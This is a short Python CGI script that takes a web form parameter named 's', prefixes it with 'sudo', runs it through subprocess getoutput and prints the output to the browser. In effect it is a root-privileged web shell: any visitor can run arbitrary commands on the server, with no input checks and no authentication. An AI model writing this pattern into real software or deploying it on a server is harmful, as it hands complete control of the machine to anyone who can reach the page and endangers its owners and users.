#!/usr/bin/python3

import cgi
from subprocess import getoutput

print("content-Type: text/html")
print()

cmd = cgi.FieldStorage()

y = cmd.getvalue("s")

output = getoutput("sudo " + y)

print(output)
